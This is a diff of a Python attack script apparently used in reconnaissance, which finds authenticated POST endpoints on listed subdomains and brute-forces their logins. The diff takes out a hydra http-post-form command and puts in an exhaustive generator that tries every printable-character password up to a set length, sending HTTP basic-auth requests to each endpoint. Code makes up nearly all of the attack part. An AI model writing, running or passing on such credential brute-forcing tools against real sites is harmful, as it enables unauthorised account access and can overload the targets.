@@ -4,10 +4,11 @@ websites that require authentication
 It can also be run as a standalone file for the domains listed in output_files/ dir
 """
 
+import itertools
 import argparse
+import string
 import sys
 import requests
-import subprocess
 from tqdm import tqdm
 from multiprocessing import cpu_count
 from concurrent.futures import ThreadPoolExecutor
@@ -30,8 +31,9 @@ def argumentParser():
 	# Required argument: domain
 	parser.add_argument("-u", "--username", help="Username to be used for the attack\n\n", required=True)
 
-	# Required argument: password_file
-	parser.add_argument("-p", "--password_file", help="Path to the file containing the passwords\n\n", required=True)
+	# Optional argument: password_length
+	parser.add_argument("-l", "--password-length", help="Length of the password to bruteforce (default: 8)\n\n",
+	                    default=8, type=int)
 
 	# Optional argument: threads
 	parser.add_argument("-t", "--threads", help=f"Number of threads to be used for the attack (default: {threads})\n\n",
@@ -40,38 +42,42 @@ def argumentParser():
 	return parser.parse_args()
 
 
-def bruteForce(post_dirs, username, password_file):
+def bruteForce(post_dirs, username, password_length):
 	"""
-	Uses the hydra tool to brute force the login page of the provided url
+	Attempts to bruteforce the POST endpoint using a given username and a brute-forcing script
 	Args:
 		 post_dirs (list): list of urls that require authentication
 		 username (str): username to be used for the attack
-		 password_file (str): path to the file containing the passwords
+		 password_length (int): maximum length of the password we wish to bruteforce
 	Returns:
 		 None
 	"""
 
+	bypassed_endpoints = {}
+	chars = string.printable
 	for url in post_dirs:
-		hydra_command = f"hydra -l {username} -P {password_file} {url} http-post-form " \
-		                f"'/:username=^USER^&password=^PASS^:F=incorrect'"
-		output = subprocess.check_output(hydra_command, shell=True)
-		if b"password found" in output:
-			with open("output_files/passwords.bat", "a") as f:
-				f.write(f"{url} - {output.split(b':')[1].decode('utf-8')}")
+		for combo in generatePasswords(chars, password_length):
+			try:
+				request = requests.post(url, auth=(username, combo))
+			except requests.exceptions.ConnectionError:
+				continue
+			if request.status_code not in [401, 403]:
+				bypassed_endpoints[url] = f"password: {combo}"
 
 
-def checkHydra():
+def generatePasswords(chars, password_length):
 	"""
-	Checks if hydra is installed on the system
-	Returns:
-		True if hydra is installed, False otherwise
+	Generator function that yields a list of password to use in a bruteforce attack
+	Args:
+		chars (str): string containing all characters we want to use in our bruteforce attack
+		password_length (int): maximum length of the password we want to generate
+	Yields:
+		combination (str): the yielded password to be iterated over in the bruteforce attack
 	"""
 
-	try:
-		subprocess.check_output(["which", "hydra"])
-		return True
-	except subprocess.CalledProcessError:
-		return False
+	for length in range(1, password_length + 1):
+		for combination in itertools.product(chars, repeat=length):
+			yield ''.join(combination)
 
 
 def loadDomainsFromFile():
@@ -82,11 +88,15 @@ def loadDomainsFromFile():
 		valid_dirs (list): list of valid directories
 	"""
 
-	with open("output_files/valid_subdomains.bat", "r") as f:
-		valid_subdomains = f.read().splitlines()
+	try:
+		with open("output_files/valid_subdomains.bat", "r") as f:
+			valid_subdomains = f.read().splitlines()
 
-	with open("output_files/valid_dirs.bat", "r") as f:
-		valid_dirs = f.read().splitlines()
+		with open("output_files/valid_dirs.bat", "r") as f:
+			valid_dirs = f.read().splitlines()
+	except FileNotFoundError:
+		print("Output_files directory not present, exiting...")
+		sys.exit(1)
 
 	return valid_subdomains, valid_dirs
 
@@ -125,10 +135,6 @@ def checkPostDirs(valid_dirs, valid_subdomains, pbar, lock):
 def main():
 	args = argumentParser()
 
-	if not checkHydra():
-		print("Hydra not found on system, cannot proceed with brute force")
-		sys.exit(1)
-
 	valid_subdomains, valid_dirs = loadDomainsFromFile()
 
 	# Divide the lists into chunks for the workers
@@ -157,8 +163,8 @@ def main():
 		print(f"Found {len(post_dirs)} POST directories that require authentication")
 
 	input_file = args.username
-	password_file = args.password_file
-	bruteForce(post_dirs, input_file, password_file)
+	password_length = args.password_length
+	bruteForce(post_dirs, input_file, password_length)
 
 
 if __name__ == "__main__":
